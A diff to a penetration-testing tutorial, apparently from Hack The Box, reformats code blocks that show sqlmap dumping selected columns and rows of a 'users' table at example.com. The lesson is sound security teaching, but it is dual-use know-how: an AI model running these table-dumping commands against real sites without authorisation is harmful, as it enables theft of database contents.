@@ -1297,13 +1297,15 @@ The console output shows that the table is dumped in formatted CSV format to a l
 
 When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only `name` and `surname` columns) with the `-C` option, as follows:
 
-        shellsession
+```shell
 `adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname ...SNIP... Database: testdb Table: users [4 entries] +--------+------------+ | name   | surname    | +--------+------------+ | luther | blisset    | | fluffy | bunny      | | wu     | ming       | | NULL   | nameisnull | +--------+------------+`
+```
 
 To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry), as follows:
 
-        shellsession
+```shell
 `adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3 ...SNIP... Database: testdb Table: users [2 entries] +----+--------+---------+ | id | name   | surname | +----+--------+---------+ | 2  | fluffy | bunny   | | 3  | wu     | ming    | +----+--------+---------+`
+```
 
 ---
 
